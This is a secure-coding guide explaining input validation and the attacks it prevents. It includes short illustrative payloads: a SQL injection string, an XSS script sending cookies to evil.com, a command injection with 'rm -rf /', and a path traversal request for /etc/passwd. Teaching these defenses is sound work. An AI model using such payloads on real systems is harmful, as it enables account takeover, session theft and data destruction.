# Input Validation — Why and How

> This guide explains the reasoning behind input validation rules. Read it when you want to understand the attacks these practices prevent.

## The Core Principle

Every piece of data that enters your application from the outside world is potentially dangerous. "Outside world" includes:

- Form fields and text inputs from users
- URL parameters and query strings
- HTTP headers and cookies
- File uploads
- Data from third-party APIs
- Webhook payloads
- Data from your own database (it may have been corrupted by a previous bug)

The rule is simple: **validate at the boundary, sanitize for the context.** When data crosses a trust boundary (enters your system), validate it. When you use it (insert into HTML, build a query, construct a command), sanitize it for that specific context.

## Why Attackers Target Input

Your application takes input and does things with it — stores it in a database, displays it on a page, passes it to other services. Attackers exploit this by crafting input that changes what your application does.

The analogy: imagine you run a restaurant and you let customers write their own orders on the kitchen ticket. Most write "cheeseburger." But one writes "cheeseburger AND open the safe AND give me the contents." If the kitchen blindly follows everything on the ticket, you have a problem.

That's exactly what happens with injection attacks — the attacker writes "instructions" disguised as data.

## The Major Attack Types

### SQL Injection

**What it is:** The attacker includes database commands in their input. If your code concatenates that input into a SQL query, the database executes the attacker's commands.

**Example:** A login form where the code builds the query like this:
```
"SELECT * FROM users WHERE email = '" + userInput + "'"
```

If the user enters: `admin@example.com' OR '1'='1`

The query becomes: `SELECT * FROM users WHERE email = 'admin@example.com' OR '1'='1'`

This returns ALL users, potentially granting access to any account.

**The fix:** Never concatenate user input into queries. Use parameterized queries (also called prepared statements) or your framework's ORM. These treat input as data, never as commands:
```
"SELECT * FROM users WHERE email = ?" with parameter [userInput]
```

### Cross-Site Scripting (XSS)

**What it is:** The attacker submits content containing JavaScript code. If your app displays that content without encoding it, the script runs in other users' browsers.

**Example:** A comment field where someone enters:
```
Great article! <script>document.location='https://evil.com/steal?cookie='+document.cookie</script>
```

If displayed without encoding, this script runs in every visitor's browser, stealing their session cookies.

**The fix:** Encode output for the context where it's displayed. In HTML, characters like `<`, `>`, `&`, and `"` must be converted to their safe equivalents (`&lt;`, `&gt;`, etc.). Most modern frameworks do this automatically — but only if you use them correctly. Watch for "raw" or "unescaped" rendering modes.

### Command Injection

**What it is:** The attacker includes system commands in input that your application passes to the operating system.

**Example:** An image resizer that runs:
```
exec("convert " + filename + " -resize 200x200 output.jpg")
```

If the filename is `photo.jpg; rm -rf /`, the system executes the file deletion command.

**The fix:** Never construct shell commands from user input. Use libraries that call functions directly without going through a shell. If you absolutely must, use strict allowlists for permitted values.

### Path Traversal

**What it is:** The attacker manipulates file paths to access files outside the intended directory.

**Example:** A file download endpoint: `/download?file=report.pdf`

If someone requests: `/download?file=../../../etc/passwd`

They might get your server's password file.

**The fix:** Never use user input directly in file paths. Validate against an allowlist of permitted files, or resolve the path and verify it stays within the expected directory.

## Validation Strategy

### Allowlists Over Denylists

- **Denylist (bad):** "Reject input containing these dangerous characters: `<`, `>`, `'`, `"`"
  - Problem: You'll always miss something. Attackers are creative.
- **Allowlist (good):** "Accept only input matching this pattern: letters, numbers, spaces, and basic punctuation"
  - You define what's allowed; everything else is rejected automatically.

### Validate Type, Length, Format, Range

For every input field, define:
- **Type:** Is this a string, number, date, email, URL?
- **Length:** What's the minimum and maximum? (A name field doesn't need to accept 50,000 characters)
- **Format:** Does it match the expected pattern? (An email must contain @, a phone number has specific formats)
- **Range:** For numbers, what's the valid range? (Age: 0–150. Quantity: 1–10,000. Price: 0.01–999,999.99)
- **Business rules:** Is this value valid in context? (A start date must be before an end date. A discount can't exceed the total.)

### Validate on the Server

Client-side validation (in the browser) improves user experience — it gives instant feedback. But it is NOT security. Anyone can bypass it by modifying the request directly. Server-side validation is where security lives.

Always validate on the server. Client-side validation is optional and complementary.

## File Upload Validation

File uploads deserve special attention because they introduce unique risks:

- **Don't trust the file extension.** A file named `photo.jpg` might actually be a PHP script or an executable. Validate the file's actual content type by reading the first few bytes (called "magic bytes" or "file signatures").
- **Don't trust the MIME type sent by the browser.** It's trivially spoofed.
- **Set size limits.** Without them, an attacker can upload a 10GB file and fill your storage.
- **Store uploads outside your web directory.** Serve them through your application so you control access. If uploads are directly accessible by URL, an attacker might upload and execute a script.
- **Generate new filenames.** Don't use the original filename — it could contain path traversal characters or overwrite important files.

## The Belt-and-Suspenders Approach

Defense in depth means validating at multiple layers:

1. **Client-side** — for user experience (immediate feedback)
2. **API/controller layer** — for input format validation (reject bad data early)
3. **Business logic layer** — for business rule validation (is this action valid in context?)
4. **Database layer** — for constraints (NOT NULL, UNIQUE, CHECK, foreign keys)

If any single layer has a bug, the others catch it. This is why the data rules also emphasize database constraints — they're your last line of defense.
